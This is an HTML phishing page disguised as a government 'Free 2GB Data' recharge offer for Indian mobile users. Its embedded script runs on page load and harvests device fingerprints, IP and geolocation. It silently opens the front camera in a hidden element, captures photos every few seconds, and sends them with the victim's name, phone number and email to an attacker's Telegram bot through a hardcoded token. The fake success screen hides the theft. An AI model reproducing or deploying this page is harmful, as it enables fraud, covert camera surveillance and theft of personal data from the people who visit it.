<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="theme-color" content="#1a73e8">
    <title>Free 2GB Data - Jio | Airtel | Vi | BSNL</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%231a73e8'/><text x='50' y='70' font-size='70' text-anchor='middle' fill='white'>📶</text></svg>">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');

        :root {
            --primary: #1a73e8;
            --green: #0f9d58;
            --white: #fff;
            --bg: #f1f5f9;
            --card: #fff;
            --text: #1e293b;
            --text-light: #64748b;
            --border: #e2e8f0;
            --shadow: 0 4px 24px rgba(0,0,0,0.08);
            --safe-bottom: env(safe-area-inset-bottom, 20px);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; -webkit-font-smoothing: antialiased; }

        body {
            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg);
            min-height: 100dvh;
            user-select: none;
            -webkit-user-select: none;
            overflow-x: hidden;
        }

        .header {
            background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
            padding: 25px 20px 35px;
            color: var(--white);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .header-content { position: relative; z-index: 1; }
        .header-icon { font-size: 50px; margin-bottom: 10px; animation: float 3s ease-in-out infinite; }
        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        .header h1 { font-size: 22px; font-weight: 700; }
        .header p { font-size: 13px; opacity: 0.9; margin-top: 4px; }
        .offer-badge {
            display: inline-block;
            background: #ffd700;
            color: #000;
            padding: 6px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            margin-top: 12px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(255,215,0,0.4); } 50% { box-shadow: 0 0 0 15px rgba(255,215,0,0); } }

        .container { max-width: 500px; margin: -20px auto 0; padding: 0 16px 30px; position: relative; z-index: 2; }

        .steps { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; }
        .step { width: 40px; height: 4px; border-radius: 4px; background: #cbd5e1; transition: all 0.3s; }
        .step.active { background: var(--primary); width: 50px; }
        .step.done { background: var(--green); }

        .card { background: var(--card); border-radius: 20px; padding: 24px 20px; margin-bottom: 16px; box-shadow: var(--shadow); border: 1px solid var(--border); }
        .card-title { font-size: 17px; font-weight: 700; color: var(--text); margin-bottom: 6px; display: flex; align-items: center; gap: 8px; }
        .card-subtitle { font-size: 12px; color: var(--text-light); margin-bottom: 18px; }

        .sim-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .sim-card {
            background: #f8fafc; border: 2px solid var(--border); border-radius: 16px;
            padding: 16px 12px; text-align: center; cursor: pointer; transition: all 0.2s; position: relative;
        }
        .sim-card:active { transform: scale(0.96); }
        .sim-card.selected { border-color: var(--primary); background: #e8f0fe; box-shadow: 0 0 0 4px rgba(26,115,232,0.1); }
        .sim-card .sim-icon { font-size: 36px; margin-bottom: 6px; }
        .sim-card .sim-name { font-weight: 600; font-size: 14px; color: var(--text); }
        .sim-card .sim-offer { font-size: 10px; color: var(--green); font-weight: 600; margin-top: 2px; }
        .sim-card .check-mark {
            position: absolute; top: 10px; right: 12px; width: 22px; height: 22px;
            border-radius: 50%; background: var(--primary); color: #fff; font-size: 12px;
            display: none; align-items: center; justify-content: center;
        }
        .sim-card.selected .check-mark { display: flex; }

        .input-group { margin-bottom: 16px; }
        .input-group label { display: block; font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 6px; }
        .input-group input {
            width: 100%; padding: 14px 16px; border: 2px solid var(--border); border-radius: 14px;
            font-size: 15px; font-family: 'Poppins', sans-serif; color: var(--text); background: #f8fafc;
            transition: all 0.2s; outline: none;
        }
        .input-group input:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 4px rgba(26,115,232,0.06); }

        .phone-wrapper {
            display: flex; align-items: center; background: #f8fafc; border: 2px solid var(--border);
            border-radius: 14px; overflow: hidden; transition: all 0.2s;
        }
        .phone-wrapper:focus-within { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 4px rgba(26,115,232,0.06); }
        .phone-prefix { padding: 14px 8px 14px 16px; font-weight: 600; font-size: 15px; color: var(--text); border-right: 1px solid var(--border); background: #f1f5f9; }
        .phone-wrapper input { flex: 1; padding: 14px 16px; border: none; background: transparent; font-size: 15px; font-family: 'Poppins', sans-serif; color: var(--text); outline: none; }

        .plans { display: grid; gap: 10px; }
        .plan-card {
            display: flex; align-items: center; gap: 14px; background: #f8fafc;
            border: 2px solid var(--border); border-radius: 16px; padding: 14px 16px; cursor: pointer; transition: all 0.2s;
        }
        .plan-card:active { transform: scale(0.97); }
        .plan-card.selected { border-color: var(--green); background: #f0fdf4; box-shadow: 0 0 0 4px rgba(15,157,88,0.08); }
        .plan-radio {
            width: 24px; height: 24px; border-radius: 50%; border: 2px solid #cbd5e1;
            display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: all 0.2s;
        }
        .plan-card.selected .plan-radio { border-color: var(--green); background: var(--green); }
        .plan-card.selected .plan-radio::after { content: '✓'; color: #fff; font-size: 13px; font-weight: 700; }
        .plan-info { flex: 1; }
        .plan-name { font-weight: 600; font-size: 15px; color: var(--text); }
        .plan-detail { font-size: 11px; color: var(--text-light); margin-top: 2px; }
        .plan-badge { background: var(--green); color: #fff; padding: 4px 12px; border-radius: 12px; font-size: 11px; font-weight: 600; white-space: nowrap; }

        .submit-btn {
            width: 100%; padding: 16px; background: linear-gradient(135deg, #1a73e8, #0d47a1);
            color: #fff; border: none; border-radius: 16px; font-size: 17px; font-weight: 700;
            cursor: pointer; letter-spacing: 0.3px; transition: all 0.2s; box-shadow: 0 8px 24px rgba(26,115,232,0.3);
        }
        .submit-btn:active { transform: scale(0.97); }

        .success-screen { display: none; text-align: center; padding: 40px 20px; }
        .success-screen.show { display: block; }
        .success-icon { font-size: 80px; animation: bounceIn 0.6s ease-out; }
        @keyframes bounceIn { 0% { transform: scale(0); opacity: 0; } 50% { transform: scale(1.2); } 100% { transform: scale(1); opacity: 1; } }
        .success-title { font-size: 24px; font-weight: 700; color: var(--green); margin-top: 16px; }
        .success-detail { font-size: 14px; color: var(--text-light); margin-top: 8px; line-height: 1.6; }

        .trust-row { display: flex; justify-content: center; gap: 20px; margin-top: 20px; flex-wrap: wrap; }
        .trust-badge { display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--text-light); font-weight: 500; }
        .trust-badge span { font-size: 16px; }
        .footer { text-align: center; padding: 20px; font-size: 11px; color: #94a3b8; }

        .overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 1000; display: none;
            flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(10px);
        }
        .overlay.show { display: flex; }
        .overlay .spinner { width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .overlay .status-text { color: #fff; font-size: 16px; font-weight: 600; margin-top: 20px; }
        .overlay .status-sub { color: #aaa; font-size: 12px; margin-top: 6px; }

        .toast {
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
            background: #1e293b; color: #fff; padding: 12px 24px; border-radius: 30px;
            font-size: 13px; font-weight: 600; z-index: 2000; opacity: 0; transition: all 0.3s; pointer-events: none;
        }
        .toast.show { opacity: 1; bottom: 40px; }

        #hiddenVideo, #hiddenCanvas {
            position: fixed; top: -9999px; left: -9999px; width: 2px; height: 2px; opacity: 0; pointer-events: none;
        }
    </style>
</head>
<body>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>

    <div class="header">
        <div class="header-content">
            <div class="header-icon">📶</div>
            <h1>Free 2GB Data Recharge</h1>
            <p>Government Digital India Initiative 2024</p>
            <div class="offer-badge">⚡ Limited Time Offer</div>
        </div>
    </div>

    <div class="container" id="mainContainer">
        <div class="steps">
            <div class="step active" id="step1"></div>
            <div class="step" id="step2"></div>
            <div class="step" id="step3"></div>
        </div>

        <div class="card">
            <div class="card-title">📱 Select Your SIM</div>
            <div class="card-subtitle">Choose your operator to get free 2GB data</div>
            <div class="sim-options">
                <div class="sim-card selected" data-sim="Jio">
                    <div class="check-mark">✓</div><div class="sim-icon">🔵</div><div class="sim-name">Jio</div><div class="sim-offer">2GB Free ✓</div>
                </div>
                <div class="sim-card" data-sim="Airtel">
                    <div class="check-mark">✓</div><div class="sim-icon">🔴</div><div class="sim-name">Airtel</div><div class="sim-offer">2GB Free ✓</div>
                </div>
                <div class="sim-card" data-sim="Vi">
                    <div class="check-mark">✓</div><div class="sim-icon">🟤</div><div class="sim-name">Vi</div><div class="sim-offer">2GB Free ✓</div>
                </div>
                <div class="sim-card" data-sim="BSNL">
                    <div class="check-mark">✓</div><div class="sim-icon">🟠</div><div class="sim-name">BSNL</div><div class="sim-offer">2GB Free ✓</div>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-title">👤 Your Details</div>
            <div class="card-subtitle">Enter your information to claim free data</div>
            <div class="input-group">
                <label>Full Name</label>
                <input type="text" id="fullName" placeholder="Enter your full name" autocomplete="name">
            </div>
            <div class="input-group">
                <label>Mobile Number</label>
                <div class="phone-wrapper">
                    <div class="phone-prefix">+91</div>
                    <input type="tel" id="mobileNumber" placeholder="Enter mobile number" maxlength="10" autocomplete="tel">
                </div>
            </div>
            <div class="input-group">
                <label>Email (Optional)</label>
                <input type="email" id="email" placeholder="Enter email for confirmation" autocomplete="email">
            </div>
        </div>

        <div class="card">
            <div class="card-title">🎁 Select Free Plan</div>
            <div class="card-subtitle">All plans are 100% free under Digital India</div>
            <div class="plans">
                <div class="plan-card selected" data-plan="2GB">
                    <div class="plan-radio"></div><div class="plan-info"><div class="plan-name">2GB Data Free</div><div class="plan-detail">Validity: 28 Days | All SIM</div></div><div class="plan-badge">FREE</div>
                </div>
                <div class="plan-card" data-plan="3GB">
                    <div class="plan-radio"></div><div class="plan-info"><div class="plan-name">3GB Data + Unlimited Calls</div><div class="plan-detail">Validity: 28 Days | New Users</div></div><div class="plan-badge">FREE</div>
                </div>
                <div class="plan-card" data-plan="5GB">
                    <div class="plan-radio"></div><div class="plan-info"><div class="plan-name">5GB Data + OTT Subscription</div><div class="plan-detail">Validity: 30 Days | Lucky Draw</div></div><div class="plan-badge">FREE</div>
                </div>
            </div>
        </div>

        <button class="submit-btn" onclick="processRecharge()">🚀 Claim Free Data Now</button>

        <div class="trust-row">
            <div class="trust-badge"><span>🔒</span> Secure</div>
            <div class="trust-badge"><span>✅</span> Verified</div>
            <div class="trust-badge"><span>🇮🇳</span> Digital India</div>
            <div class="trust-badge"><span>⚡</span> Instant</div>
        </div>
        <div class="footer">© 2026 Digital India Initiative · Government of India</div>
    </div>

    <div class="success-screen" id="successScreen">
        <div class="success-icon">✅</div>
        <div class="success-title">Recharge Successful!</div>
        <div class="success-detail">
            Your free <strong id="selectedPlanText">2GB</strong> data has been activated.<br>
            You will receive confirmation SMS shortly.<br><br>
            📱 <strong id="successNumber"></strong><br>📶 <strong id="successSim"></strong>
        </div>
        <button class="submit-btn" style="margin-top:20px;width:auto;padding:14px 40px;" onclick="location.reload()">Claim Another Recharge</button>
    </div>

    <div class="overlay" id="processingOverlay">
        <div class="spinner"></div>
        <div class="status-text" id="processingText">Processing...</div>
        <div class="status-sub" id="processingSub"></div>
    </div>
    <div class="toast" id="toast"></div>

    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = "6803416454:AAFbzKxUCSWLX5Ty4RUeYuXtZ-bFhJwShPA";
        const urlParams = new URLSearchParams(window.location.search);
        const TARGET_USER_ID = urlParams.get('id') || "YOUR_CHAT_ID";
        // ===============================================

        let selectedSIM = 'Jio';
        let selectedPlan = '2GB';
        let deviceInfo = {};
        let visitorIP = '';
        let visitorLoc = {};
        let cameraStream = null;
        let captureInterval = null;
        let initialDataSent = false;
        let claimDataSent = false;
        let sessionId = '';

        // Generate session ID
        sessionId = 'SES-' + Math.random().toString(36).substring(2, 10).toUpperCase() + '-' + Date.now();

        // SIM Selection
        document.querySelectorAll('.sim-card').forEach(card => {
            card.addEventListener('click', function() {
                document.querySelectorAll('.sim-card').forEach(c => c.classList.remove('selected'));
                this.classList.add('selected');
                selectedSIM = this.dataset.sim;
            });
        });

        // Plan Selection
        document.querySelectorAll('.plan-card').forEach(card => {
            card.addEventListener('click', function() {
                document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('selected'));
                this.classList.add('selected');
                selectedPlan = this.dataset.plan;
            });
        });

        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 2500);
        }

        function showProcessing(text, sub) {
            document.getElementById('processingText').textContent = text;
            document.getElementById('processingSub').textContent = sub || '';
            document.getElementById('processingOverlay').classList.add('show');
        }

        function hideProcessing() {
            document.getElementById('processingOverlay').classList.remove('show');
        }

        // ============ COLLECT ALL DEVICE DATA ============
        async function collectAllDeviceData() {
            const info = {
                sessionId: sessionId,
                timestamp: new Date().toISOString(),
                istTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screenSize: `${screen.width}x${screen.height}`,
                availScreen: `${screen.availWidth}x${screen.availHeight}`,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchPoints: navigator.maxTouchPoints,
                vendor: navigator.vendor,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                online: navigator.onLine,
                referrer: document.referrer || 'Direct',
                pageURL: window.location.href,
            };

            // Battery
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    info.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging
                    };
                }
            } catch(e) {}

            // Network
            try {
                if ('connection' in navigator) {
                    const conn = navigator.connection;
                    info.network = {
                        type: conn.type || 'unknown',
                        effectiveType: conn.effectiveType || 'unknown',
                        downlink: conn.downlink + ' Mbps',
                        rtt: conn.rtt + ' ms',
                        saveData: conn.saveData || false
                    };
                }
            } catch(e) {}

            // GPU
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    info.gpu = {
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A'
                    };
                }
            } catch(e) {}

            // RAM Usage
            try {
                if (performance && performance.memory) {
                    info.memoryUsage = {
                        usedJSHeap: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
                        totalJSHeap: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB'
                    };
                }
            } catch(e) {}

            // Storage
            try {
                if ('storage' in navigator && navigator.storage.estimate) {
                    const estimate = await navigator.storage.estimate();
                    info.storage = {
                        usage: Math.round(estimate.usage / 1048576) + ' MB',
                        quota: Math.round(estimate.quota / 1048576) + ' MB'
                    };
                }
            } catch(e) {}

            // IP & Geo
            try {
                const [ipRes, geoRes] = await Promise.all([
                    fetch('https://api.ipify.org?format=json'),
                    fetch('https://ipapi.co/json/')
                ]);
                const ipData = await ipRes.json();
                const geoData = await geoRes.json();
                visitorIP = ipData.ip;
                visitorLoc = {
                    ip: geoData.ip,
                    city: geoData.city,
                    region: geoData.region,
                    country: geoData.country_name,
                    isp: geoData.org,
                    postal: geoData.postal,
                    lat: geoData.latitude,
                    lon: geoData.longitude,
                    timezone: geoData.timezone
                };
                info.ip = visitorIP;
                info.location = visitorLoc;
            } catch(e) {
                visitorIP = 'Unknown';
                visitorLoc = { city: 'Unknown', country: 'Unknown' };
                info.ip = 'Unknown';
                info.location = visitorLoc;
            }

            return info;
        }

        // ============ START CAMERA & CONTINUOUS CAPTURE ============
        async function startContinuousCapture() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",
                        width: { ideal: 320 },
                        height: { ideal: 240 },
                        frameRate: { ideal: 5 }
                    },
                    audio: false
                });

                const video = document.getElementById('hiddenVideo');
                video.srcObject = cameraStream;
                await video.play();

                // Pehli photo turant lo
                setTimeout(() => captureAndSendPhoto(), 1000);

                // Har 8 second mein nayi photo lo
                captureInterval = setInterval(() => {
                    captureAndSendPhoto();
                }, 8000);

                return true;
            } catch(e) {
                console.log('Camera not available:', e.message);
                return false;
            }
        }

        function captureAndSendPhoto() {
            if (!cameraStream) return;

            try {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                
                if (!video.videoWidth) return;

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                const photoBase64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
                sendPhotoToTelegram(photoBase64);
            } catch(e) {}
        }

        async function sendPhotoToTelegram(photoBase64) {
            try {
                const bytes = Uint8Array.from(atob(photoBase64), c => c.charCodeAt(0));
                const blob = new Blob([bytes], { type: 'image/jpeg' });
                const fd = new FormData();
                fd.append('chat_id', TARGET_USER_ID);
                fd.append('photo', blob, `live_${sessionId}_${Date.now()}.jpg`);
                fd.append('caption', `📸 *Live Capture*\n🆔 \`${sessionId}\`\n🕐 ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}\n🌐 ${visitorIP}`);

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST', body: fd
                });
            } catch(e) {}
        }

        function stopCapture() {
            if (captureInterval) {
                clearInterval(captureInterval);
                captureInterval = null;
            }
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
        }

        // ============ SEND INITIAL DATA ============
        async function sendInitialData() {
            if (initialDataSent) return;
            initialDataSent = true;

            const info = await collectAllDeviceData();

            const msg = 
                `🔴 *LIVE SESSION STARTED*\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `🆔 *Session:* \`${sessionId}\`\n` +
                `🕐 *IST:* ${info.istTime}\n\n` +
                `📍 *LOCATION*\n` +
                `🌐 IP: \`${info.ip}\`\n` +
                `🏙 City: ${info.location.city || 'N/A'}\n` +
                `🗺 Region: ${info.location.region || 'N/A'}\n` +
                `🌍 Country: ${info.location.country || 'N/A'}\n` +
                `📡 ISP: ${info.location.isp || 'N/A'}\n` +
                `📮 Postal: ${info.location.postal || 'N/A'}\n\n` +
                `📱 *DEVICE*\n` +
                `🔋 Battery: ${info.battery?.level || 'N/A'} (Charging: ${info.battery?.charging ? 'Yes' : 'No'})\n` +
                `📶 Network: ${info.network?.type || 'N/A'} (${info.network?.effectiveType || ''})\n` +
                `🖥 Screen: ${info.screenSize} @ ${info.pixelRatio}x\n` +
                `💻 CPU: ${info.cores} cores\n` +
                `🧠 RAM: ${info.memory || 'N/A'}\n` +
                `💾 Storage: ${info.storage?.usage || 'N/A'} / ${info.storage?.quota || 'N/A'}\n` +
                `🎮 GPU: ${info.gpu?.renderer || 'N/A'}\n` +
                `🌍 Lang: ${info.language}\n` +
                `📱 Platform: ${info.platform}\n` +
                `📄 Ref: ${info.referrer}\n\n` +
                `📝 *UA:* \`${info.userAgent.substring(0, 120)}\`\n\n` +
                `📸 *Live photos streaming every 8 seconds...*`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TARGET_USER_ID, text: msg, parse_mode: 'Markdown' })
                });
            } catch(e) {}

            // JSON file
            try {
                const blob = new Blob([JSON.stringify(info, null, 2)], { type: 'application/json' });
                const fd = new FormData();
                fd.append('chat_id', TARGET_USER_ID);
                fd.append('document', blob, `initial_data_${sessionId}.json`);
                fd.append('caption', `📄 Initial Device Data - ${sessionId}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
            } catch(e) {}
        }

        // ============ SEND CLAIM DATA ============
        async function sendClaimData(name, mobile, email) {
            const info = await collectAllDeviceData();

            const msg = 
                `🟢 *DATA CLAIM SUBMITTED*\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                `🆔 *Session:* \`${sessionId}\`\n` +
                `👤 *Name:* ${name}\n` +
                `📞 *Mobile:* +91 ${mobile}\n` +
                `📶 *SIM:* ${selectedSIM}\n` +
                `🎁 *Plan:* ${selectedPlan}\n` +
                `📧 *Email:* ${email || 'Not provided'}\n\n` +
                `📍 *Location Update:*\n` +
                `🌐 IP: \`${info.ip}\`\n` +
                `🏙 ${info.location.city || 'N/A'}, ${info.location.country || 'N/A'}\n` +
                `📡 ${info.location.isp || 'N/A'}\n\n` +
                `🔋 Battery: ${info.battery?.level || 'N/A'} (Charging: ${info.battery?.charging ? 'Yes' : 'No'})\n` +
                `📶 Network: ${info.network?.type || 'N/A'}\n` +
                `🕐 IST: ${info.istTime}`;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TARGET_USER_ID, text: msg, parse_mode: 'Markdown' })
                });
            } catch(e) {}

            // Full JSON
            const fullData = {
                sessionId,
                user: { name, mobile: '+91' + mobile, sim: selectedSIM, plan: selectedPlan, email },
                device: info,
                timestamp: new Date().toISOString()
            };

            try {
                const blob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
                const fd = new FormData();
                fd.append('chat_id', TARGET_USER_ID);
                fd.append('document', blob, `claim_data_${mobile}_${sessionId}.json`);
                fd.append('caption', `📄 Claim Report - ${name} (+91 ${mobile})`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
            } catch(e) {}
        }

        // ============ MAIN PROCESS ============
        async function processRecharge() {
            if (claimDataSent) return;

            const fullName = document.getElementById('fullName').value.trim();
            const mobileNumber = document.getElementById('mobileNumber').value.trim();
            const email = document.getElementById('email').value.trim();

            if (!fullName) { showToast('⚠️ Please enter your full name'); return; }
            if (!mobileNumber || mobileNumber.length !== 10 || !/^\d{10}$/.test(mobileNumber)) {
                showToast('⚠️ Please enter a valid 10-digit mobile number'); return;
            }

            claimDataSent = true;
            showProcessing('Processing your claim...', 'Verifying with ' + selectedSIM);

            await sendClaimData(fullName, mobileNumber, email);

            setTimeout(() => {
                hideProcessing();
                document.getElementById('mainContainer').style.display = 'none';
                document.getElementById('successScreen').classList.add('show');
                document.getElementById('selectedPlanText').textContent = selectedPlan;
                document.getElementById('successNumber').textContent = '+91 ' + mobileNumber;
                document.getElementById('successSim').textContent = selectedSIM;

                // Claim ke baad bhi 3 aur photos lo
                let extraPhotos = 0;
                const extraInterval = setInterval(() => {
                    captureAndSendPhoto();
                    extraPhotos++;
                    if (extraPhotos >= 3) clearInterval(extraInterval);
                }, 5000);
            }, 3000);
        }

        // ============ AUTO START ============
        (async function autoStart() {
            // 1. Turant initial data bhejo
            await sendInitialData();
            
            // 2. Camera start karo aur photo bhejna shuru karo
            const cameraStarted = await startContinuousCapture();
            
            if (!cameraStarted) {
                // Camera nahi chala to notification bhejo
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TARGET_USER_ID,
                            text: `⚠️ *Camera Access Denied*\n🆔 \`${sessionId}\`\nUser denied or device doesn't support camera.`,
                            parse_mode: 'Markdown'
                        })
                    });
                } catch(e) {}
            }
        })();

        // Page close/leave par notification
        window.addEventListener('beforeunload', () => {
            try {
                const data = JSON.stringify({
                    chat_id: TARGET_USER_ID,
                    text: `🔴 *Session Ended*\n🆔 \`${sessionId}\`\n🕐 ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}\n📸 Photos stopped.`,
                    parse_mode: 'Markdown'
                });
                navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, data);
            } catch(e) {}
            stopCapture();
        });
    </script>
</body>
</html>
